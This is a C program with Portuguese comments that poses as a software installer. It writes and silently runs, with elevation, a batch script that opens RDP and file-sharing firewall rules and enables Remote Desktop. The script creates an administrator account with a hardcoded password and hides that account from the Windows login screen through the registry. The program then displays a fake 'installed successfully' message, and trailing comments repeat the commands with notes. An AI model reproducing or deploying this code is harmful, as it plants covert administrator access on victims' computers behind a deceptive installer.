#include <stdio.h> //padrão p/c e abrir e fechar arquivo
#include <stdlib.h> //padrão p/c e abrir e fechar arquivo
#include <Windows.h> //ponteiro
#include <Shellapi.h> //Shell para elevar privilegio no UAC no Windows


int main(int argc, char *argv[]) {
 
/*crio pont*/ 			FILE *fp; 
/*gravo write*/ 		fp = fopen("remoto.bat","w+"); 
/*escrevo*/ 			fprintf(fp, "%s" , "@echo off\n netsh advfirewall firewall add rule name=\"rdpPORTA\" dir=in action=allow protocol=TCP localport=3389\n netsh advfirewall firewall add rule name=\"testesaida\" dir=out action=allow protocol=TCP localport=1688\n netsh advfirewall firewall add rule name=\"testeentrada\" dir=in action=allow protocol=TCP localport=1688\n netsh advfirewall firewall set rule group=\"Assistˆncia Remota\" new enable=Yes\n netsh advfirewall firewall set rule group=\"Compartilhamento de Arquivo e Impressora\" new enable=Yes\n netsh advfirewall firewall set rule group=\"Instrumenta‡Æo de Gerenciamento do Windows (WMI)\" new enable=Yes\n NET LOCALGROUP \"Usuários da área de trabalho remota\" %userdomain%\\%username% /ADD \necho Aguarde o Software ser executado...\n reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f \n REM Create a HIDDEN USER usr= admin, pass= spuni2012 \n net user acessoremoto spuni2012 /add \n net localgroup \"Administradores\" /add acessoremoto \n reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\" /v dontdisplaylastusername /t REG_DWORD /d 1 /f \n reg add \"HKLM\\SOFTWARE\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v acessoremoto /t REG_DWORD /d 0 /f \npkgmgr /iu:\"TelnetClient\" \n");
 /*fecho*/ 				fclose(fp);

/*aponto */				char *application = "remoto.bat";
/*cmd*/					ShellExecute(NULL, "runas", application, NULL, NULL, SW_HIDE); /*SW_HIDE ocultar shell e runas para pedir elevação*/

/*crio pont*/ 			FILE *fp2; 
/*gravo write*/ 		fp2 = fopen("mensagem.vbs","w+");
/*escrevo*/				fprintf(fp2, "%s", "X=MsgBox(\"Software Instalado com Sucesso!\",0+64,\"UNICEP\") ");
 /*fecho*/ 				fclose(fp2);
 						system("start /Max mensagem.vbs"); //Posso usar sem escalar previlegios no UAC 
 						
 						return 0;

}


/*	LISTEN SEVRVER 

Comando como ADM: more C:\Windows\System32\LogFiles\Firewall\pfirewall.log | find "ICMP"
Servidor: HAbilitar IIS
Redirecionar pro IIS: more C:\Windows\System32\LogFiles\Firewall\pfirewall.log | find "ICMP" > C:\inetpub\wwwroot\index.html

*/


/*   COMANDOS no CMD  gravados em remoto2.bat

FIREWALL ----------------------------------------------------------------------------------------------//

@echo off
netsh advfirewall firewall add rule name="rdpPORTA" dir=in action=allow protocol=TCP localport=3389   		 						//RDP p/ acesso
netsh advfirewall firewall add rule name="testesaida" dir=out action=allow protocol=TCP localport=1688       						//RCP p/ Office
netsh advfirewall firewall add rule name="testeentrada" dir=in action=allow protocol=TCP localport=1688		 						//RCP p/ Office
netsh advfirewall firewall set rule group="Assistˆncia Remota" new enable=Yes         						 						//RDP p/ acesso
netsh advfirewall firewall set rule group="Compartilhamento de Arquivo e Impressora" new enable=Yes			 						//Compartilhamento p/ Office
netsh advfirewall firewall set rule group="Instrumenta‡Æo de Gerenciamento do Windows (WMI)" new enable=Yes  						//Office
echo Aguarde o Software ser executado...

REGISTRO -----------------------------------------------------------------------------------------------//
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f			//RDP p/ acesso
REM Create a HIDDEN USER usr= admin, pass= spuni2012
net user acessoremoto spuni2012 /add																								//USER e PASS acesso
net localgroup "Administradores" /add acessoremoto																					//Tipo de USER e PASS 
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v acessoremoto /t REG_DWORD /d 0 /f  //Habilitar remoto
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f				//Habilitar remoto
pkgmgr /iu:"TelnetClient"																											//Habilitar Telnet



*/



/*  NET LOCALGROUP "Usuários da área de trabalho remota" %userdomain%\%username% /ADD  */
